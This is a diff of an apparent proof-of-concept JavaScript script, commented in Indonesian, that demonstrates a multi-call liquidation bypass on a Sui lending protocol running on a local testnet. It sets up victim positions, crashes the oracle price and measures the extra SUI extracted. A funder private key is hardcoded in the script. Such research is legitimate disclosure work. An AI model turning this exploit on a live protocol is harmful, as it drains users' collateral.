@@ -13,22 +13,22 @@ import { decodeSuiPrivateKey } from '@mysten/sui/cryptography';
 const client = new SuiClient({ url: 'http://127.0.0.1:9000' });
 
 // ==================== KONFIGURASI LOCAL TESTNET (ID TERBARU) ====================
-// Dari output_protocol_baru6.txt (Digest: cfpDsv6fdMT8YB42me4fz9KjipSFLkTkjD5fGjHFNsd)
-const PKG = "0x8b77e86f16be67d515b541832db98685f9e3222755a006a16faefc1d708e0368";
-const VERSION = "0x012a28995664119b14c16dc994468264de4fe87de0da3777ab20a541c1d7a1b1";
-const MARKET = "0x202d358a60236b6213a1ca09f0c066110733aeb4b28f2a84b38ef63448542fd3";
-const ORACLE = "0xcb4b1bfa28b37ad78f593ef530e2191dbbf86f2044d2ec7c4074c9d8dc7d1d95";
-const REGISTRY = "0xb3eaef60ae89f2f547bf482bb7123367e4ca0cbcc44af94eaae57b8ee4bbbc2e";
+// Dari output_protocol_baru6 (Digest: Cr9tGhLpPAnB4J5FQ6rrdUgoJ25PhqtBCVkhRBmcyeyz)
+const PKG = "0xf6fb9ac036283f6f9c64040bf60ca224be87d4cfb7dd3eebdd7fc84968d399a9";
+const VERSION = "0x2541d637ccfcf24d7184223961c82030b87af609393d021e0ad4be07ed5192bd";
+const MARKET = "0x7641dc60082a0441f559f61deec6ef1341a2f78729f5f3526d1a800dbc8a6748";
+const ORACLE = "0xa1103fc08cb673830a3f49c4c3d70a9d16d9e5b8fda2eea336048de155e03775";
+const REGISTRY = "0x970ef68581ee6677176f98eecd80df5e3e4e756b4c886bc18f209a1f015d47db";
 const CLOCK = "0x6";
 
-// Testcoin IDs (Dipertahankan karena file baru6 tidak berisi deployment testcoin)
-const TEST_COIN_PKG = "0x49244f3fe3d3dceeb86369f8477925e37aa06fd38eb01246e38bc5a0fb145ac8";
+// Dari output_testcoin_baru6 (Digest: CA5SzmzgRjcu9w2utAB7AoSuUPsM7Mn416H6h3zh7z2i)
+const TEST_COIN_PKG = "0xdbcd6eaed1b5cca52ca76f95a4c5cf6f0fa1eba413374d9fecb58c2e8a0dc542";
 const USDC_TYPE = `${TEST_COIN_PKG}::usdc::USDC`;
 const ETH_TYPE = `${TEST_COIN_PKG}::eth::ETH`;
 const SUI_TYPE = "0x2::sui::SUI";
 
-const USDC_TREASURY = "0x06ca2b511dca04d11825f7281f9a28a14e0cffeb939ee64d4c8dd17342ff7370";
-const ETH_TREASURY = "0xf4ea188b9c5ffa1e39a06ebc4f8db91f6a85ee317a1882a838a27d5c03ebe532";
+const USDC_TREASURY = "0x60075b3c7c4c2973c61eb5abee75bb735b9e381280664a89916a40968c09d26d";
+const ETH_TREASURY = "0xef0794caef74f67c20d3098bd67cbef874ac4e05dae38942161c345c39419864";
 
 // PRIVATE KEY FUNDER
 const funderPrivateKeyStr = "suiprivkey1qzuxayfjwjmrqat03vkjh5nrt66fp4utywud2x8v0k0a6fg453yg7j2kcaa";
@@ -92,6 +92,13 @@ async function executeTx(tx, keypair) {
         transaction: tx,
         options: { showEffects: true, showObjectChanges: true },
     });
+    
+    // TAMBAHAN: Catch error secara eksplisit agar debug lebih mudah
+    if (result.effects.status.status !== 'success') {
+        console.error("[ERROR] Transaction Failed!", JSON.stringify(result.effects, null, 2));
+        throw new Error(`Transaction failed: ${result.effects.status.error}`);
+    }
+    
     await new Promise(r => setTimeout(r, 1500));
     return result;
 }
@@ -126,7 +133,7 @@ async function readObligationState(obligationId) {
 
 // ==================== PHASE 0: INITIALIZE MARKET ====================
 async function initializeMarket(adminCapId) {
-    console.log("\n[INIT] Initializing Market (Whitelist, Models, Oracle)...");
+    console.log("\n[INIT] Initializing Market (Whitelist, Models, Oracle, APM)...");
 
     const suiMetaId = await findCoinMetadata(SUI_TYPE);
     const usdcMetaId = await findCoinMetadata(USDC_TYPE);
@@ -241,12 +248,12 @@ async function initializeMarket(adminCapId) {
         });
     };
 
-    // FIX: Accrue Interest untuk inisialisasi BorrowIndex & SupplyIndex dynamic fields
-    const accrueInterest = (coinType) => {
+    // PERBAIKAN: Tambahkan fungsi setApmThreshold
+    const setApmThreshold = (coinType, threshold) => {
         tx.moveCall({
-            target: `${PKG}::accrue_interest::accrue_interest`,
+            target: `${PKG}::app::set_apm_threshold`,
             typeArguments: [coinType],
-            arguments: [tx.object(VERSION), tx.object(MARKET), tx.object(CLOCK)],
+            arguments: [tx.object(adminCapId), tx.object(MARKET), tx.pure.u64(threshold)],
         });
     };
 
@@ -268,7 +275,7 @@ async function initializeMarket(adminCapId) {
     setSupplyLimit(SUI_TYPE, 10n ** 18n);
     setBorrowLimit(SUI_TYPE, 10n ** 18n);
     setBorrowFee(SUI_TYPE, 0n, 1n);
-    accrueInterest(SUI_TYPE);
+    setApmThreshold(SUI_TYPE, 1000n); // <--- PERBAIKAN APM
 
     // USDC
     registerDecimals(USDC_TYPE, usdcMetaId);
@@ -288,7 +295,7 @@ async function initializeMarket(adminCapId) {
     setSupplyLimit(USDC_TYPE, 10n ** 18n);
     setBorrowLimit(USDC_TYPE, 10n ** 18n);
     setBorrowFee(USDC_TYPE, 0n, 1n);
-    accrueInterest(USDC_TYPE);
+    setApmThreshold(USDC_TYPE, 1000n); // <--- PERBAIKAN APM
 
     // ETH
     registerDecimals(ETH_TYPE, ethMetaId);
@@ -308,7 +315,7 @@ async function initializeMarket(adminCapId) {
     setSupplyLimit(ETH_TYPE, 10n ** 18n);
     setBorrowLimit(ETH_TYPE, 10n ** 18n);
     setBorrowFee(ETH_TYPE, 0n, 1n);
-    accrueInterest(ETH_TYPE);
+    setApmThreshold(ETH_TYPE, 1000n); // <--- PERBAIKAN APM
 
     await executeTx(tx, funderKeypair);
     console.log("[INIT] Market initialized successfully!");
@@ -431,23 +438,20 @@ async function setupVictim(victimKeypair, label, adminCapId, xOraclePkg) {
         arguments: [initPriceTx.object(ORACLE), initPriceTx.object(CLOCK), initPriceTx.pure.u64(200_000_000_000n)],
     });
 
-    await executeTx(initPriceTx, funderKeypair);
-    console.log(`[${label}] Step 4.5 done: Initialized oracle prices (SUI=$1, USDC=$1, ETH=$2000)`);
+    // PERBAIKAN: Refresh APM state untuk SUI (kolateral) agar tersimpan di history APM
+    initPriceTx.moveCall({
+        target: `${PKG}::apm::refresh_apm_state`,
+        typeArguments: [SUI_TYPE],
+        arguments: [
+            initPriceTx.object(VERSION), 
+            initPriceTx.object(MARKET), 
+            initPriceTx.object(ORACLE), 
+            initPriceTx.object(CLOCK)
+        ],
+    });
 
-    // FIX: Accrue Interest manual sebelum borrow untuk memastikan index dynamic field tercreate
-    const accrueTx = new Transaction();
-    accrueTx.moveCall({
-        target: `${PKG}::accrue_interest::accrue_interest`,
-        typeArguments: [USDC_TYPE],
-        arguments: [accrueTx.object(VERSION), accrueTx.object(MARKET), accrueTx.object(CLOCK)],
-    });
-    accrueTx.moveCall({
-        target: `${PKG}::accrue_interest::accrue_interest`,
-        typeArguments: [ETH_TYPE],
-        arguments: [accrueTx.object(VERSION), accrueTx.object(MARKET), accrueTx.object(CLOCK)],
-    });
-    await executeTx(accrueTx, funderKeypair);
-    console.log(`[${label}] Step 4.6 done: Accrued interest to initialize borrow indices`);
+    await executeTx(initPriceTx, funderKeypair);
+    console.log(`[${label}] Step 4.5 done: Initialized oracle prices and refreshed APM state`);
 
     const borrowUSDCTx = new Transaction();
     const [borrowedUSDC] = borrowUSDCTx.moveCall({
@@ -512,9 +516,9 @@ async function crashOraclePrice(xOraclePkg) {
 
 // ==================== PHASE 3: BEFORE EXPLOIT (Single Call) ====================
 async function beforeExploit_singleCall(victimObligationId) {
-    console.log("\n============================================================");
+    console.log("\n" + "=".repeat(60));
     console.log("BEFORE EXPLOIT: Single Liquidation Call");
-    console.log("============================================================");
+    console.log("=".repeat(60));
 
     const stateBefore = await readObligationState(victimObligationId);
     console.log(`[BEFORE] Collateral SUI: ${stateBefore.collateralAmount}`);
@@ -559,9 +563,9 @@ async function beforeExploit_singleCall(victimObligationId) {
 
 // ==================== PHASE 4: AFTER EXPLOIT (Multi Call) ====================
 async function afterExploit_multiCall(victimObligationId) {
-    console.log("\n============================================================");
+    console.log("\n" + "=".repeat(60));
     console.log("AFTER EXPLOIT: Multi-Call Liquidation");
-    console.log("============================================================");
+    console.log("=".repeat(60));
 
     const stateBefore = await readObligationState(victimObligationId);
 
@@ -632,9 +636,9 @@ async function afterExploit_multiCall(victimObligationId) {
 
 // ==================== MAIN EXECUTION ====================
 async function main() {
-    console.log("============================================================");
-    console.log("  PoC: Multi-Call Liquidation Bypass (Local Testnet)       ");
-    console.log("============================================================");
+    console.log("╔═══════════════════════════════════════════════════════════╗");
+    console.log("║  PoC: Multi-Call Liquidation Bypass (Local Testnet)       ║");
+    console.log("╚═══════════════════════════════════════════════════════════╝");
 
     console.log("\n[DEBUG] Checking Funder Balances...");
     await printBalances(funderAddress);
@@ -642,7 +646,7 @@ async function main() {
     const adminCapId = await findAdminCap();
     const xOraclePkg = await getXOraclePackage();
 
-    // Localnet fresh -> initializeMarket WAJIB dijalankan
+    // Localnet fresh → initializeMarket WAJIB dijalankan
     await initializeMarket(adminCapId);
 
     const victimA = Ed25519Keypair.generate();
@@ -659,9 +663,9 @@ async function main() {
     const beforeResult = await beforeExploit_singleCall(vA.obligationId);
     const afterResult = await afterExploit_multiCall(vB.obligationId);
 
-    console.log("\n============================================================");
+    console.log("\n" + "=".repeat(60));
     console.log("FINAL IMPACT ANALYSIS");
-    console.log("============================================================");
+    console.log("=".repeat(60));
     console.log(`Single-Call Extracted : ${beforeResult.extracted} SUI`);
     console.log(`Multi-Call Extracted  : ${afterResult.extracted} SUI`);
 
